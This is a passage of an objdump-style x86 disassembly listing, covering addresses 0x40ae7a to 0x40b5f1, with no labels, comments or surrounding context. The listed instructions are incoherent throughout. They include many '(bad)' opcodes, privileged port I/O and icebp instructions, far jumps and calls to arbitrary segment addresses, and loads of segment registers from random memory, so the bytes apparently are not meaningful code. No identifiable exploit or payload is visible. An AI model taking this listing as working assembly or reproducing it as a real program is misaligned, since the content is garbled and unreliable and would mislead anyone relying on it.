  40ae7a:	ds fs (bad) 
  40ae7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae7e:	sbb    BYTE PTR [edx-0x41ba3b60],0x8b
  40ae85:	movntq (bad),mm2
  40ae86:	out    0xd0,eax
  40ae88:	xor    DWORD PTR [ecx],ebx
  40ae8a:	fs jmp 0x839d:0xa0e86062
  40ae92:	sbb    ah,BYTE PTR [eax-0x409fcb08]
  40ae98:	into   
  40ae99:	inc    ebx
  40ae9a:	in     eax,0x55
  40ae9c:	mov    ecx,gs
  40ae9e:	mov    bh,0x18
  40aea0:	xor    esi,ebx
  40aea2:	pop    edi
  40aea3:	daa    
  40aea4:	outs   dx,DWORD PTR ds:[esi]
  40aea5:	push   ebx
  40aea6:	aad    0xed
  40aea8:	mov    ds:0xfb5e6ba5,eax
  40aead:	sub    DWORD PTR [edi-0x1b20dd79],ebp
  40aeb3:	repz inc ebx
  40aeb5:	push   ss
  40aeb6:	and    BYTE PTR [edx],ah
  40aeb8:	or     al,0xf1
  40aeba:	pop    eax
  40aebb:	jge    0x40af0b
  40aebd:	out    dx,al
  40aebe:	pop    edi
  40aebf:	dec    esp
  40aec0:	lods   eax,DWORD PTR ds:[esi]
  40aec1:	sar    DWORD PTR [eax+esi*1-0x467f4d15],0x7
  40aec9:	loope  0x40ae83
  40aecb:	(bad)  
  40aecc:	int    0xb2
  40aece:	push   edx
  40aecf:	(bad)  
  40aed0:	mov    edi,0x2853e591
  40aed5:	mov    bh,0x41
  40aed7:	icebp  
  40aed8:	inc    eax
  40aed9:	sbb    ecx,DWORD PTR ds:[edx]
  40aedc:	push   edi
  40aedd:	sti    
  40aede:	inc    edx
  40aedf:	jmp    0xd5d8:0xd142909c
  40aee6:	add    dl,BYTE PTR [eax]
  40aee8:	mov    BYTE PTR [ebx],cl
  40aeea:	adc    al,BYTE PTR [edi+0x6bc3c2b6]
  40aef0:	inc    ebx
  40aef1:	rcl    DWORD PTR [edx-0x45084d77],1
  40aef7:	popa   
  40aef8:	xor    bl,BYTE PTR [esi-0x207d4a7c]
  40aefe:	lds    esp,FWORD PTR ds:0x3e7a134e
  40af04:	nop
  40af05:	xor    edi,edx
  40af07:	dec    eax
  40af08:	cmp    DWORD PTR [edx+0x468b199],esp
  40af0e:	ss jl  0x40aec6
  40af11:	mov    dh,BYTE PTR gs:[ebx]
  40af14:	push   ebp
  40af15:	pop    esp
  40af16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af17:	ds dec ebp
  40af19:	mov    al,0x67
  40af1b:	sbb    BYTE PTR ds:0x50478e4c,0xde
  40af22:	jl     0x40aee2
  40af24:	cwde   
  40af25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40af26:	pop    esp
  40af27:	mov    dl,0xba
  40af29:	gs mov ebx,edi
  40af2c:	aaa    
  40af2d:	pop    es
  40af2e:	mov    ss,WORD PTR ds:0x7138c21d
  40af34:	xchg   DWORD PTR [ebx+0x7f172c84],eax
  40af3a:	sbb    al,0x4f
  40af3c:	je     0x40aeeb
  40af3e:	jge    0x40af5d
  40af40:	add    cl,BYTE PTR [esi-0x47a61508]
  40af46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af47:	and    BYTE PTR [edx+0x699825a6],0x47
  40af4e:	inc    ebx
  40af4f:	cmp    DWORD PTR [esi-0x5ee6db82],ecx
  40af55:	(bad)  [edx+ebx*8+0x3d]
  40af59:	aas    
  40af5a:	adc    ah,0xb2
  40af5d:	mov    ebp,0x2d82b78c
  40af62:	or     eax,0x3f52a4ea
  40af67:	sub    bh,BYTE PTR [ebp-0x67e962b2]
  40af6d:	mov    edx,0x559a29d9
  40af72:	lods   eax,DWORD PTR ds:[esi]
  40af73:	mov    WORD PTR [eax+0x73],cs
  40af76:	jge    0x40afba
  40af78:	(bad)  
  40af79:	jp     0x40af9d
  40af7b:	shl    DWORD PTR [ebx+eax*8],cl
  40af7e:	dec    esi
  40af7f:	imul   edi,DWORD PTR [esi],0xffffff86
  40af82:	xor    al,0xac
  40af84:	bound  ebx,QWORD PTR [eax+0xf8d0316]
  40af8a:	ret    0xa2f0
  40af8d:	mov    dl,0xa1
  40af8f:	aas    
  40af90:	xchg   ecx,eax
  40af91:	enter  0xfd54,0x7a
  40af95:	push   0xd4289b94
  40af9a:	dec    edi
  40af9b:	mov    al,ds:0x633ee495
  40afa0:	imul   esp,DWORD PTR [eax-0x23],0xffffffa8
  40afa4:	sub    al,0x3f
  40afa6:	add    ecx,edi
  40afa8:	ret    0x69e9
  40afab:	out    dx,eax
  40afac:	dec    eax
  40afad:	jg     0x40afe4
  40afaf:	out    0xe4,eax
  40afb1:	fldcw  WORD PTR [ebx]
  40afb3:	imul   ebp,DWORD PTR [edx+0x5c],0xc32941e5
  40afba:	mov    ebx,0x7828902
  40afbf:	scas   al,BYTE PTR es:[edi]
  40afc0:	ss stos DWORD PTR es:[edi],eax
  40afc2:	imul   ebp,edi,0xddf132fe
  40afc8:	cmp    eax,DWORD PTR [eax-0x47]
  40afcb:	sbb    al,0xa1
  40afcd:	loope  0x40af61
  40afcf:	shr    BYTE PTR [ebp+eax*8+0x15],1
  40afd3:	and    eax,0xdf579722
  40afd8:	mov    esp,0x59672438
  40afdd:	pop    ecx
  40afde:	xor    bh,ah
  40afe0:	es jmp 0xe1c:0x4d9f7d8e
  40afe8:	jge    0x40b058
  40afea:	daa    
  40afeb:	cmp    eax,0x7d8f87b6
  40aff0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aff1:	shl    ah,0x4c
  40aff4:	das    
  40aff5:	mov    al,ds:0x4c667e23
  40affa:	ja     0x40af8a
  40affc:	xchg   esi,eax
  40affd:	mov    ebp,0x2ecc0eb3
  40b002:	out    dx,al
  40b003:	mov    esi,0x934e6df6
  40b008:	ss mov si,0x7a7b
  40b00d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b00e:	ins    BYTE PTR es:[edi],dx
  40b00f:	imul   edx,DWORD PTR [ebp-0x3612b6e9],0xffffffc3
  40b016:	addr16 pop es
  40b018:	sbb    ebx,DWORD PTR ds:0xd0a8fb11
  40b01e:	or     eax,0x1f34794d
  40b023:	jbe    0x40b039
  40b025:	(bad)  
  40b026:	loopne 0x40b082
  40b028:	sbb    al,0x5d
  40b02a:	pop    edi
  40b02b:	mov    esp,0xa5e866f5
  40b030:	mov    eax,0x1f21f22d
  40b035:	sbb    ebx,DWORD PTR ss:[ecx]
  40b038:	call   0xd40b:0xa05bb5b2
  40b03f:	inc    ebx
  40b040:	dec    esi
  40b041:	out    dx,eax
  40b042:	retf   
  40b043:	ins    BYTE PTR es:[edi],dx
  40b044:	and    eax,0xd3b7a2c7
  40b049:	outs   dx,BYTE PTR ds:[esi]
  40b04a:	dec    ebx
  40b04b:	lods   eax,DWORD PTR ds:[esi]
  40b04c:	in     eax,0x59
  40b04e:	mov    al,0xbb
  40b050:	jge    0x40b00c
  40b052:	aaa    
  40b053:	fstp   st(7)
  40b055:	(bad)  
  40b056:	mov    edi,0x626fceac
  40b05b:	out    dx,al
  40b05c:	out    dx,eax
  40b05d:	data16 and BYTE PTR [edi+0x64],dl
  40b061:	inc    edx
  40b062:	rcl    DWORD PTR [edx-0x66],cl
  40b065:	imul   edi,DWORD PTR [edx+edx*1],0x8aec8ac7
  40b06c:	test   BYTE PTR gs:[esi-0x38ac16eb],bl
  40b073:	fcmovnb st,st(3)
  40b075:	(bad)  
  40b077:	sub    ebx,ebp
  40b079:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b07a:	pop    ss
  40b07b:	ror    DWORD PTR [ebx+0x5c],1
  40b07e:	neg    BYTE PTR [edx-0x28]
  40b081:	pop    edx
  40b082:	jle    0x40b0aa
  40b084:	cs pop ecx
  40b086:	jne    0x40b0e7
  40b088:	fisubr WORD PTR [edi+0x26]
  40b08b:	pop    eax
  40b08c:	fidivr WORD PTR [edx-0x10be356a]
  40b092:	mov    ds:0x2a0d2ff1,al
  40b097:	adc    eax,0xcaeded2b
  40b09c:	push   es
  40b09d:	inc    edi
  40b09e:	scas   al,BYTE PTR es:[edi]
  40b09f:	sub    al,cl
  40b0a1:	jecxz  0x40b0ad
  40b0a3:	inc    edi
  40b0a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b0a5:	pop    es
  40b0a6:	jle    0x40b08e
  40b0a8:	xchg   ebp,eax
  40b0a9:	ja     0x40b08f
  40b0ab:	fscale 
  40b0ad:	inc    edi
  40b0ae:	xchg   esp,eax
  40b0af:	iret   
  40b0b0:	sbb    eax,0x8835c2e7
  40b0b5:	call   0xd162:0xde172a6b
  40b0bc:	jg     0x40b05b
  40b0be:	mov    ah,0xc9
  40b0c0:	inc    edi
  40b0c1:	jg     0x40b069
  40b0c3:	in     al,dx
  40b0c4:	mov    edx,0x63d69f8f
  40b0c9:	out    dx,eax
  40b0ca:	mov    ecx,0xe3a2424
  40b0cf:	mov    ds:0x6dd1fe04,eax
  40b0d4:	sub    al,0x4
  40b0d6:	(bad)  
  40b0d8:	test   eax,0x1b6abb00
  40b0dd:	mov    esi,DWORD PTR [esi]
  40b0df:	test   al,0x5c
  40b0e1:	retf   
  40b0e2:	rcr    BYTE PTR [edx],cl
  40b0e4:	ins    DWORD PTR es:[edi],dx
  40b0e5:	mov    ecx,0xe1bd5336
  40b0ea:	pop    ss
  40b0eb:	es das 
  40b0ed:	out    dx,al
  40b0ee:	and    bl,BYTE PTR [eax-0x6837352e]
  40b0f4:	mov    bh,0x81
  40b0f6:	loop   0x40b0bf
  40b0f8:	fsub   DWORD PTR [ebp+0x70]
  40b0fb:	push   ds
  40b0fc:	jge    0x40b122
  40b0fe:	out    0x87,eax
  40b100:	cmp    DWORD PTR [edx-0x3358b064],edx
  40b106:	push   ds
  40b107:	mov    ss,WORD PTR [ebx+edx*8]
  40b10a:	mov    edx,0x7ebe1a09
  40b10f:	ret    
  40b110:	out    0x84,al
  40b112:	repz or al,0x3b
  40b115:	lods   al,BYTE PTR ds:[esi]
  40b116:	in     al,0x2e
  40b118:	into   
  40b119:	push   eax
  40b11a:	push   0xbbb4f8a1
  40b11f:	mov    bl,0x2d
  40b121:	cdq    
  40b122:	xor    bh,BYTE PTR [edi+ebx*1]
  40b125:	inc    edx
  40b126:	pop    esi
  40b127:	pushf  
  40b128:	sti    
  40b129:	sub    edi,DWORD PTR [ebx-0x3f]
  40b12c:	or     al,0x98
  40b12e:	xchg   esi,eax
  40b12f:	adc    dl,0x26
  40b132:	mov    ecx,0xb9d4a005
  40b137:	xor    esi,esi
  40b139:	cmp    eax,0x43da8711
  40b13e:	inc    esp
  40b13f:	xor    al,0x39
  40b141:	xchg   esi,eax
  40b142:	daa    
  40b143:	pop    ebp
  40b144:	jg     0x40b186
  40b146:	add    DWORD PTR [edx],edi
  40b148:	xchg   ebp,eax
  40b149:	sbb    BYTE PTR [ebx-0x47],bh
  40b14c:	cmc    
  40b14d:	or     ah,ah
  40b14f:	stos   DWORD PTR es:[edi],eax
  40b150:	push   edi
  40b151:	(bad)  
  40b152:	pop    ebp
  40b153:	pop    ecx
  40b154:	cmp    BYTE PTR [edi+0x62f3471e],bh
  40b15a:	(bad)  
  40b15b:	jl     0x40b1d4
  40b15d:	xor    eax,0x26ac992e
  40b162:	mov    bh,0x59
  40b164:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b165:	mov    eax,0x9a15a6c0
  40b16a:	jp     0x40b19e
  40b16c:	sub    al,0xd2
  40b16e:	xchg   BYTE PTR [esi+0x54],bl
  40b171:	lea    ebp,ds:0x49a0438e
  40b177:	cs mov al,0x6e
  40b17a:	enter  0x16c8,0xd6
  40b17e:	aas    
  40b17f:	dec    ecx
  40b180:	and    DWORD PTR [ebx-0x31],eax
  40b183:	imul   edi,DWORD PTR [edi-0x55c6e3d9],0x4b84a38f
  40b18d:	jae    0x40b1e9
  40b18f:	lds    eax,FWORD PTR [eax+0x81fcae4]
  40b195:	adc    BYTE PTR ds:0xe6a63b05,ah
  40b19b:	push   eax
  40b19c:	outs   dx,DWORD PTR ds:[esi]
  40b19d:	inc    ecx
  40b19e:	sub    BYTE PTR ds:0xc5834a35,0x71
  40b1a5:	jecxz  0x40b1ce
  40b1a7:	dec    esp
  40b1a8:	out    dx,al
  40b1a9:	jns    0x40b1a0
  40b1ab:	cmp    eax,0xc02bc18a
  40b1b0:	into   
  40b1b1:	inc    ebx
  40b1b2:	shl    DWORD PTR [eax+0x407dcecb],1
  40b1b8:	in     al,dx
  40b1b9:	jbe    0x40b21a
  40b1bb:	hlt    
  40b1bc:	inc    edx
  40b1bd:	arpl   di,bx
  40b1bf:	aas    
  40b1c0:	ror    BYTE PTR [esi],0x3c
  40b1c3:	(bad)  
  40b1c4:	sar    ch,0xea
  40b1c7:	cmp    al,0xfa
  40b1c9:	outs   dx,BYTE PTR ds:[esi]
  40b1ca:	(bad)  
  40b1cb:	cs (bad) 
  40b1ce:	mov    dl,0x7d
  40b1d0:	dec    esp
  40b1d1:	inc    eax
  40b1d2:	fild   QWORD PTR [ecx-0x1c]
  40b1d5:	mov    fs,WORD PTR [edx+ebx*1-0x6c]
  40b1d9:	or     eax,0xe7f8450d
  40b1de:	xchg   ecx,eax
  40b1df:	adc    al,0x76
  40b1e1:	jp     0x40b1e3
  40b1e3:	pop    edi
  40b1e4:	xchg   BYTE PTR [ecx+ecx*1-0x32250da],cl
  40b1eb:	scas   eax,DWORD PTR es:[edi]
  40b1ec:	inc    edx
  40b1ed:	je     0x40b245
  40b1ef:	int3   
  40b1f0:	dec    eax
  40b1f1:	retf   
  40b1f2:	ja     0x40b1de
  40b1f4:	test   DWORD PTR [esi+esi*2+0x46],ebx
  40b1f8:	mov    al,ds:0x6a40c1c0
  40b1fd:	inc    ebx
  40b1fe:	mul    BYTE PTR [ebx-0x70]
  40b201:	scas   eax,DWORD PTR es:[edi]
  40b202:	popf   
  40b203:	xor    al,BYTE PTR [eax]
  40b205:	fcmovbe st,st(4)
  40b207:	(bad)  
  40b208:	in     al,0x7a
  40b20a:	pop    ds
  40b20b:	ret    
  40b20c:	dec    edx
  40b20d:	lahf   
  40b20e:	ins    DWORD PTR es:[edi],dx
  40b20f:	inc    esi
  40b210:	dec    eax
  40b211:	mov    cl,BYTE PTR [edi-0x7a]
  40b214:	pop    ss
  40b215:	add    al,dh
  40b217:	jns    0x40b24a
  40b219:	setno  BYTE PTR [eax+0x25]
  40b21d:	xchg   edx,eax
  40b21e:	mov    BYTE PTR [esi],cl
  40b220:	sub    DWORD PTR [ebx-0x25],esi
  40b223:	jno    0x40b1c8
  40b225:	adc    al,0x8
  40b227:	xchg   ebx,eax
  40b228:	loopne 0x40b25b
  40b22a:	imul   edx,DWORD PTR [eax+eiz*1-0xc],0xffffffa8
  40b22f:	repz popf 
  40b231:	inc    ebx
  40b232:	cld    
  40b233:	jbe    0x40b21f
  40b235:	push   edi
  40b236:	or     cl,BYTE PTR [ebx-0x43]
  40b239:	or     eax,eax
  40b23b:	test   DWORD PTR [edi-0x79289142],eax
  40b241:	mov    esp,0x80dddfe0
  40b246:	mov    eax,DWORD PTR [ebx+eiz*2]
  40b249:	aaa    
  40b24a:	mov    esp,0x8bf72a5
  40b24f:	jg     0x40b24e
  40b251:	inc    eax
  40b252:	sti    
  40b253:	rcl    DWORD PTR [eax-0x23],1
  40b256:	or     ch,BYTE PTR [edx-0x25]
  40b259:	pop    ebx
  40b25a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b25b:	test   DWORD PTR fs:[esi+0x50],ecx
  40b25f:	popf   
  40b260:	dec    esp
  40b261:	mov    edi,0x24e485bd
  40b266:	add    al,BYTE PTR [ebx+edx*4]
  40b269:	les    eax,FWORD PTR [ebx-0x58713960]
  40b26f:	ror    ebx,cl
  40b271:	xor    eax,0xc34ab8ca
  40b276:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b277:	aaa    
  40b278:	cmp    al,BYTE PTR [ebp+0x7]
  40b27b:	loopne 0x40b213
  40b27d:	ja     0x40b221
  40b27f:	adc    ebp,ebx
  40b281:	int    0x8d
  40b283:	loop   0x40b25f
  40b285:	out    dx,al
  40b286:	cs fwait
  40b288:	sub    BYTE PTR [ecx],0x85
  40b28b:	mov    fs,WORD PTR [edx+0x7a]
  40b28e:	(bad)  
  40b28f:	cmp    DWORD PTR [ebx+0x1c1ad3c1],esi
  40b295:	fucomp st(0)
  40b297:	adc    esp,0x9efa42bd
  40b29d:	mov    edi,esp
  40b29f:	fcmove st,st(6)
  40b2a1:	daa    
  40b2a2:	fidiv  DWORD PTR [ecx]
  40b2a4:	sub    DWORD PTR [ecx+0x155b6f2e],ecx
  40b2aa:	pop    ebp
  40b2ab:	mov    bl,0xae
  40b2ad:	mov    edx,0xf666e825
  40b2b2:	cli    
  40b2b3:	pop    ecx
  40b2b4:	jecxz  0x40b28b
  40b2b6:	in     eax,0xb6
  40b2b8:	gs (bad) 
  40b2ba:	cmp    eax,0x16453e1
  40b2bf:	jne    0x40b2eb
  40b2c1:	int3   
  40b2c2:	sahf   
  40b2c3:	loope  0x40b319
  40b2c5:	jnp    0x40b32f
  40b2c7:	dec    esi
  40b2c8:	and    ebx,DWORD PTR [eax]
  40b2ca:	ficom  DWORD PTR [edi-0x3e188448]
  40b2d0:	mov    edx,0xce6f061f
  40b2d5:	jge    0x40b2bf
  40b2d7:	cmp    DWORD PTR [ebx+ecx*1+0x4b6e2811],ebx
  40b2de:	les    edi,FWORD PTR [esi+0x4]
  40b2e1:	adc    BYTE PTR [edi],dl
  40b2e3:	jle    0x40b288
  40b2e5:	clts   
  40b2e7:	push   ebx
  40b2e8:	lods   eax,DWORD PTR ds:[esi]
  40b2e9:	cmp    eax,0xb16ced3c
  40b2ee:	bound  esp,QWORD PTR [ecx]
  40b2f0:	ja     0x40b2d6
  40b2f2:	sbb    al,0x1e
  40b2f4:	mov    DWORD PTR [ebp+0x4a1459ab],edx
  40b2fa:	cld    
  40b2fb:	adc    BYTE PTR ds:0x9f64abf5,bl
  40b301:	dec    edi
  40b302:	leave  
  40b303:	cmp    BYTE PTR [edx+0x1e3ddd02],bl
  40b309:	xor    bh,al
  40b30b:	dec    ecx
  40b30c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b30d:	rol    BYTE PTR [ecx+ebp*4-0x798ea7d3],1
  40b314:	in     eax,0x9d
  40b316:	mov    DWORD PTR [ebp+0x663f87a9],eax
  40b31c:	addr16 jmp 0x4c40:0xa97de1a5
  40b324:	dec    ebp
  40b325:	fidiv  WORD PTR [edi]
  40b327:	sbb    BYTE PTR [edi+eiz*4],bl
  40b32a:	sbb    DWORD PTR [bp+di],eax
  40b32d:	mov    al,ds:0xaf3832dd
  40b332:	test   eax,0x5424ce8f
  40b337:	jg     0x40b3a3
  40b339:	jge    0x40b330
  40b33b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b33c:	outs   dx,BYTE PTR ds:[esi]
  40b33d:	cli    
  40b33e:	cmp    edx,DWORD PTR [esi]
  40b340:	dec    BYTE PTR [ebp-0x290222a0]
  40b346:	sbb    dh,BYTE PTR [edx+0x3f]
  40b349:	test   eax,0x4ca419a4
  40b34e:	jns    0x40b3bb
  40b350:	loope  0x40b36c
  40b352:	pushf  
  40b353:	xor    edi,DWORD PTR [eax]
  40b355:	repnz xor bl,BYTE PTR ds:0xf57d67f7
  40b35c:	jnp    0x40b2eb
  40b35e:	cmp    ah,0xfa
  40b361:	mov    dh,0x16
  40b363:	xchg   ebx,eax
  40b364:	push   0x7ad17b03
  40b369:	lds    ebx,FWORD PTR [ebx+eax*1]
  40b36c:	jecxz  0x40b301
  40b36e:	lods   al,BYTE PTR ds:[esi]
  40b36f:	js     0x40b2fc
  40b371:	pop    es
  40b372:	add    edi,ebp
  40b374:	dec    edx
  40b375:	stos   DWORD PTR es:[edi],eax
  40b376:	dec    eax
  40b377:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b378:	xor    BYTE PTR [esp+esi*2+0x39],bl
  40b37c:	adc    ebx,DWORD PTR [edi]
  40b37e:	and    DWORD PTR [edx+0x61a75b55],edx
  40b384:	dec    esi
  40b385:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b386:	dec    esi
  40b387:	mov    ds:0x68d0d6c0,al
  40b38c:	ret    
  40b38d:	xchg   BYTE PTR [ecx+0xb96c748],bh
  40b393:	retf   0xe577
  40b396:	arpl   bx,sp
  40b398:	dec    edi
  40b399:	jmp    0xfcce42b8
  40b39e:	cmp    BYTE PTR [ebx+0x48],cl
  40b3a1:	shl    BYTE PTR ds:0xd8b3764b,cl
  40b3a7:	cmovo  esi,DWORD PTR [edi+0x4c5ec5c9]
  40b3ae:	add    BYTE PTR [edx+eiz*4+0x42],bl
  40b3b2:	push   0xffffffb3
  40b3b4:	imul   ebx,ebp,0xb
  40b3b7:	nop
  40b3b8:	or     ch,bl
  40b3ba:	les    ebx,FWORD PTR [edi+esi*4]
  40b3bd:	push   ss
  40b3be:	cmp    bh,BYTE PTR [ebx+ecx*4-0x7dc78b11]
  40b3c5:	jp     0x40b392
  40b3c7:	and    BYTE PTR [ebx+0x32],cl
  40b3ca:	mov    al,0x8f
  40b3cc:	cmp    esi,DWORD PTR [ecx]
  40b3ce:	add    al,0xb1
  40b3d0:	adc    DWORD PTR [edi-0x5b0989bd],esi
  40b3d6:	mov    dh,0x73
  40b3d8:	(bad)  
  40b3d9:	inc    esp
  40b3da:	call   0xca60:0x2af3595c
  40b3e1:	jo     0x40b445
  40b3e3:	pusha  
  40b3e4:	add    al,0x14
  40b3e6:	ret    
  40b3e7:	or     eax,0xdc28de09
  40b3ec:	xor    dl,BYTE PTR [ebx-0x7e]
  40b3ef:	sub    DWORD PTR [ecx],edi
  40b3f1:	pop    esp
  40b3f2:	jns    0x40b43f
  40b3f4:	pop    ebp
  40b3f5:	(bad)  
  40b3f6:	jle    0x40b437
  40b3f8:	test   BYTE PTR [eax+0x700e5f27],ch
  40b3fe:	addr16 jnp 0x40b434
  40b401:	pop    ebx
  40b402:	inc    edi
  40b403:	push   0x6a14693d
  40b408:	inc    ebp
  40b409:	cmc    
  40b40a:	aaa    
  40b40b:	sbb    ah,ch
  40b40d:	fwait
  40b40e:	lods   eax,DWORD PTR ds:[esi]
  40b40f:	pop    ss
  40b410:	in     al,0xab
  40b412:	cmp    ebx,DWORD PTR [edx]
  40b414:	or     dl,dl
  40b416:	repz (bad) 
  40b419:	(bad)  
  40b41a:	sbb    eax,0x2d691bc
  40b41f:	mov    eax,ds:0x30f5aae8
  40b424:	xor    eax,0x786960d0
  40b429:	mov    dh,BYTE PTR [edi-0x2d]
  40b42c:	cdq    
  40b42d:	mov    edi,0xbd2459a7
  40b432:	(bad)  
  40b434:	icebp  
  40b435:	pop    esi
  40b436:	adc    DWORD PTR [esi-0x60e3527d],eax
  40b43c:	push   edx
  40b43d:	xchg   ebp,eax
  40b43e:	sbb    edx,DWORD PTR [ebx]
  40b440:	xlat   BYTE PTR ds:[ebx]
  40b441:	push   es
  40b442:	sub    eax,0xd4ba94b1
  40b447:	daa    
  40b448:	cmp    bl,BYTE PTR [eax-0x195f06ad]
  40b44e:	int    0x1e
  40b450:	jb     0x40b4b4
  40b452:	icebp  
  40b453:	cld    
  40b454:	fisub  WORD PTR ds:0x225856cf
  40b45a:	pushf  
  40b45b:	in     al,dx
  40b45c:	sbb    eax,0x9a747581
  40b461:	mov    cl,0xeb
  40b463:	imul   eax,DWORD PTR [esi-0x276500ff],0xffffffd6
  40b46a:	inc    ecx
  40b46b:	nop
  40b46c:	enter  0xea09,0xc
  40b470:	dec    edi
  40b471:	scas   al,BYTE PTR es:[edi]
  40b472:	xor    DWORD PTR [esi+0x4ca2a004],ecx
  40b478:	gs mov edi,0x15ed38d3
  40b47e:	mov    edx,0x66f04036
  40b483:	mov    es,WORD PTR [edi+0x7c8ffe35]
  40b489:	aas    
  40b48a:	sbb    al,0xcb
  40b48c:	(bad)  
  40b48d:	lahf   
  40b48e:	bound  esi,QWORD PTR [ebx+0x34806f9e]
  40b494:	(bad)  
  40b496:	add    ch,BYTE PTR [edi-0x4f71e4a]
  40b49c:	mov    dh,0x11
  40b49e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b49f:	cli    
  40b4a0:	(bad)  
  40b4a1:	and    DWORD PTR [ecx],eax
  40b4a3:	test   eax,0xfb2fefe2
  40b4a8:	out    0x4c,al
  40b4aa:	inc    BYTE PTR [ebp-0x5af857cd]
  40b4b0:	cmp    al,0xb6
  40b4b2:	sbb    bh,dl
  40b4b4:	xor    eax,0x8ecb7259
  40b4b9:	not    BYTE PTR [eax-0x35c28512]
  40b4bf:	sbb    esi,DWORD PTR [ebx+ebp*8]
  40b4c2:	fcomi  st,st(5)
  40b4c4:	mov    dh,0x1e
  40b4c6:	add    DWORD PTR [edi+0x76],ebx
  40b4c9:	aas    
  40b4ca:	inc    ebp
  40b4cb:	add    bh,ch
  40b4cd:	sub    ah,BYTE PTR [esp+esi*4]
  40b4d0:	mov    ss,WORD PTR [ebx+0x2d805328]
  40b4d6:	jb     0x40b52b
  40b4d8:	dec    ebx
  40b4d9:	jg     0x40b4da
  40b4db:	into   
  40b4dc:	inc    ecx
  40b4dd:	mov    al,0xe4
  40b4df:	sbb    DWORD PTR [edi],0xffffffc9
  40b4e2:	pop    ds
  40b4e3:	mov    ebx,edx
  40b4e5:	lock mov ah,cl
  40b4e8:	addr16 push ecx
  40b4ea:	outs   dx,BYTE PTR ds:[esi]
  40b4eb:	mov    al,0x2
  40b4ed:	sub    eax,0x37a44e20
  40b4f2:	add    eax,0x3e74671d
  40b4f7:	clc    
  40b4f8:	mov    ch,0xff
  40b4fa:	sub    dh,dl
  40b4fc:	not    BYTE PTR [esi+ebp*8+0x39]
  40b500:	push   esi
  40b501:	ja     0x40b547
  40b503:	or     BYTE PTR [esi],ch
  40b505:	inc    edx
  40b506:	xor    al,0xad
  40b508:	js     0x40b4c7
  40b50a:	out    dx,eax
  40b50b:	cmp    al,0x14
  40b50d:	div    BYTE PTR [ecx+0x2955ed45]
  40b513:	test   BYTE PTR [edx],dh
  40b515:	mov    ch,BYTE PTR [ebp+0x4de3c227]
  40b51b:	jo     0x40b4de
  40b51d:	mov    ch,0xa7
  40b51f:	lea    eax,[edi+0x3341db63]
  40b525:	mov    edx,0x63056bd8
  40b52a:	hlt    
  40b52b:	stc    
  40b52c:	les    esi,FWORD PTR [edi-0x5cc8f2b6]
  40b532:	and    eax,0xb3f64296
  40b537:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b538:	imul   ecx,ebp,0xa
  40b53b:	lahf   
  40b53c:	clc    
  40b53d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b53e:	mov    bl,0x17
  40b540:	and    BYTE PTR [eax],al
  40b542:	ret    0x3428
  40b545:	jmp    0x894a:0x7b361f09
  40b54c:	adc    cl,BYTE PTR [ebx+edx*4]
  40b54f:	int    0xa1
  40b551:	push   0x37
  40b553:	jmp    0x40b57c
  40b555:	ja     0x40b588
  40b557:	xchg   ebx,eax
  40b558:	es mov edi,0x25e9868b
  40b55e:	scas   al,BYTE PTR es:[edi]
  40b55f:	push   eax
  40b560:	daa    
  40b561:	dec    edx
  40b562:	sub    bl,BYTE PTR [edi+0x7b]
  40b565:	mov    edx,0x9e097496
  40b56a:	sub    bh,al
  40b56c:	popf   
  40b56d:	shr    BYTE PTR [eax],cl
  40b56f:	sti    
  40b570:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b571:	loopne 0x40b57b
  40b573:	cmp    ch,dl
  40b575:	or     BYTE PTR [eax-0x1b86335e],0x19
  40b57c:	xchg   ebp,eax
  40b57d:	clc    
  40b57e:	sbb    DWORD PTR [edi],0x6ddd074f
  40b584:	pusha  
  40b585:	mov    dl,0xa0
  40b587:	inc    esi
  40b588:	(bad)  
  40b589:	fldenv [edx+ebx*8+0x40]
  40b58d:	bound  ebp,QWORD PTR [eax]
  40b58f:	xchg   edi,eax
  40b590:	cmp    ah,al
  40b592:	jg     0x40b57f
  40b594:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b595:	mov    ch,0x92
  40b597:	mov    ah,0x3b
  40b599:	out    0x48,eax
  40b59b:	test   cl,ah
  40b59d:	push   edx
  40b59e:	jne    0x40b57b
  40b5a0:	push   cs
  40b5a1:	test   eax,0x6fbdaab9
  40b5a6:	fwait
  40b5a7:	xchg   DWORD PTR [eax-0x5fc375a7],ecx
  40b5ad:	pop    ss
  40b5ae:	repz pop ss
  40b5b0:	or     eax,0xf7cbe3a8
  40b5b5:	pusha  
  40b5b6:	sti    
  40b5b7:	and    DWORD PTR [ebp+0x65e04277],edx
  40b5bd:	sub    DWORD PTR [eax+0x61],esi
  40b5c0:	mov    ebp,0x2d98f22b
  40b5c5:	fwait
  40b5c6:	loopne 0x40b558
  40b5c8:	in     eax,dx
  40b5c9:	ret    0x4f78
  40b5cc:	fiadd  DWORD PTR [edi-0x140be381]
  40b5d2:	pusha  
  40b5d3:	lea    edx,[edx+0x6e76e49d]
  40b5d9:	gs mov ecx,edi
  40b5dc:	mov    ch,0x86
  40b5de:	xor    al,0x1
  40b5e0:	and    al,0xd4
  40b5e2:	push   ebp
  40b5e3:	ret    0x8250
  40b5e6:	sub    ah,BYTE PTR ds:0xcd921a9c
  40b5ec:	in     al,dx
  40b5ed:	and    ecx,eax
  40b5ef:	xchg   ah,dh
  40b5f1:	push   edi
